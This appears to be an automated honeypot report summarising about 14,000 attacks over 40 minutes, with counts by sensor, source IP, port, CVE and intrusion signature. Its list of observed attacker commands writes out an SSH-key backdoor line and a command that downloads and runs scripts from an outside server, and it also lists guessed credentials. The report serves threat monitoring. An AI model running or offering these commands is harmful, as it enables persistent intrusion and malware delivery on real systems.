Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-06T03:01:42Z
**Timeframe:** 2025-10-06T02:20:01Z to 2025-10-06T03:00:01Z
**Files Used:** agg_log_20251006T022001Z.json, agg_log_20251006T024001Z.json, agg_log_20251006T030001Z.json

**Executive Summary**

This report summarizes honeypot activity over a 40-minute period, analyzing data from three log files. A total of 14,219 attacks were recorded, with a significant number targeting the Cowrie and Suricata honeypots. The most frequent attacks originated from IP addresses 183.88.241.84, 86.54.42.238, and 176.65.141.117. The most targeted ports were 25 (SMTP), 445 (SMB), and 22 (SSH). Several CVEs were exploited, with CVE-2005-4050 being the most common. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access.

**Detailed Analysis**

**Attacks by Honeypot:**
- Cowrie: 5528
- Suricata: 2774
- Honeytrap: 2080
- Mailoney: 1686
- Ciscoasa: 1345
- Sentrypeer: 546
- Dionaea: 87
- H0neytr4p: 50
- Tanner: 28
- Honeyaml: 22
- ConPot: 17
- Redishoneypot: 15
- Dicompot: 12
- Miniprint: 12
- Adbhoney: 10
- ElasticPot: 4
- Ipphoney: 3

**Top Attacking IPs:**
- 183.88.241.84: 888
- 86.54.42.238: 821
- 176.65.141.117: 820
- 80.94.95.238: 619
- 4.144.169.44: 553
- 172.86.95.98: 486
- 103.140.249.123: 406
- 61.231.193.181: 346
- 115.84.183.242: 302
- 177.130.248.114: 278
- 36.133.1.162: 246
- 193.32.162.157: 248
- 103.23.198.86: 213
- 77.87.40.114: 199
- 196.190.251.205: 199
- 103.172.205.208: 179
- 139.59.46.176: 173
- 190.108.79.125: 157
- 162.240.109.153: 117
- 103.187.162.235: 99
- 152.42.247.36: 98
- 92.204.186.222: 97
- 68.183.207.213: 94
- 36.90.71.159: 79
- 117.33.183.172: 56
- 122.165.60.231: 37
- 2.57.121.112: 27
- 91.239.206.59: 20
- 192.210.184.18: 19

**Top Targeted Ports/Protocols:**
- 25: 1686
- TCP/445: 885
- 22: 818
- 5060: 546

**Most Common CVEs:**
- CVE-2005-4050: 19
- CVE-2021-44228 CVE-2021-44228: 15
- CVE-2021-3449 CVE-2021-3449: 4
- CVE-2019-11500 CVE-2019-11500: 4
- CVE-2006-2369: 2
- CVE-2002-0013 CVE-2002-0012: 2
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 2
- CVE-2024-40891 CVE-2024-40891: 1

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `Enter new UNIX password:`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `cat /proc/cpuinfo | grep model | grep name | wc -l`
- `top`
- `uname`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `cd /data/local/tmp/; busybox wget http://185.237.253.28/w.sh; sh w.sh; curl http://185.237.253.28/c.sh; sh c.sh; wget http://185.237.253.28/wget.sh; sh wget.sh; curl http://185.237.253.28/wget.sh; sh wget.sh; busybox wget http://185.237.253.28/wget.sh; sh wget.sh; busybox curl http://185.237.253.28/wget.sh; sh wget.sh`

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 881
- ET DROP Dshield Block Listed Source group 1: 670
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 309
- ET SCAN NMAP -sS window 1024: 146
- ET SCAN Suspicious inbound to MSSQL port 1433: 43

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34: 24
- merlin/merlin: 4
- sheffield/123: 3
- root/: 3
- archana/1234: 3
- ama/ama123: 3

**Files Uploaded/Downloaded:**
- generate_204: 8
- wget.sh;: 4
- w.sh;: 1
- c.sh;: 1
- genomecrawler): 1

**HTTP User-Agents:** (No data)
**SSH Clients:** (No data)
**SSH Servers:** (No data)
**Top Attacker AS Organizations:** (No data)

**Key Observations and Anomalies**

- The high number of attacks on the Cowrie honeypot suggests a focus on SSH-based attacks.
- The prevalence of commands related to gathering system information and manipulating SSH keys indicates attackers are attempting to establish persistent and unauthorized access.
- The "DoublePulsar Backdoor" signature suggests attempts to install a known backdoor, likely associated with the EternalBlue exploit.
- The command `cd /data/local/tmp/; busybox wget ...` indicates attempts to download and execute malicious scripts from a remote server. This is a common tactic for malware propagation.
